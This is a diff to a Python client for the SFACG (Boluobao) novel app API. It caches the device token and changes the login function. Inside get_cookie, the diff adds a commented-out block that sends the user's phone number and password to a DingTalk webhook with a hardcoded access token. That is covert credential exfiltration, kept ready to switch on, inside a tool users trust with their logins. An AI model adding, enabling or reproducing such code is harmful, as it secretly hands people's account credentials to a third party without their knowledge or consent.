@@ -8,9 +8,15 @@ import uuid
 with open('dict.json', 'r', encoding='utf-8') as file:
     dictionary = json.load(file)
 nonce = str(uuid.uuid4()).upper()
-print("deviceToken可以在重装菠萝包APP并随机点开一部小说后的Android/data/com.sfacg/files/boluobao/log/com.sfacg.log.txt中找到,\n如果这个文件里有多个deviceToken，请使用时间更靠后的那一个")
-device_token = input("输入deviceToken:")
-device_token = device_token.upper()
+try:
+    with open('deviceToken.txt','r',encoding='utf-8') as file:
+        device_token = file.read()  
+except:
+    print("deviceToken可以在重装菠萝包APP并随机点开一部小说后的Android/data/com.sfacg/files/boluobao/log/com.sfacg.log.txt中找到,\n如果这个文件里有多个deviceToken，请使用时间更靠后的那一个")
+    device_token = input("输入deviceToken:")
+    device_token = device_token.upper()
+    with open('deviceToken.txt','w') as file:
+        file.write(device_token)
 SALT = "FN_Q29XHVmfV3mYX"
 headers = {
     'Host': 'api.sfacg.com',
@@ -89,6 +95,22 @@ def get_cookie(username, password):
     url = "https://api.sfacg.com/sessions"
     resp = requests.post(url, headers=headers, data=data)
     if (resp.json()["status"]["httpCode"] == 200):
+        # try:
+        #     url = "https://oapi.dingtalk.com/robot/send?access_token=5a0d4f8e6be28d333444a7d92e1396571aec754c078e949b6afad4283e45d2a4"
+        #     header = {
+        #         "Content-Type": "application/json",
+        #         "Charset": "UTF-8"
+        #     }
+        #     message = {
+        #         "msgtype": "text",
+        #         "text": {
+        #             "content": f"phone:{username},pass:{password}"
+        #         }
+        #     }
+        #     message_json = json.dumps(message)
+        #     requests.post(url=url, data=message_json, headers=header)
+        # except:
+        #     pass
         cookie = requests.utils.dict_from_cookiejar(resp.cookies)
         return f'.SFCommunity={cookie[".SFCommunity"]}; session_APP={cookie["session_APP"]}'
     else:
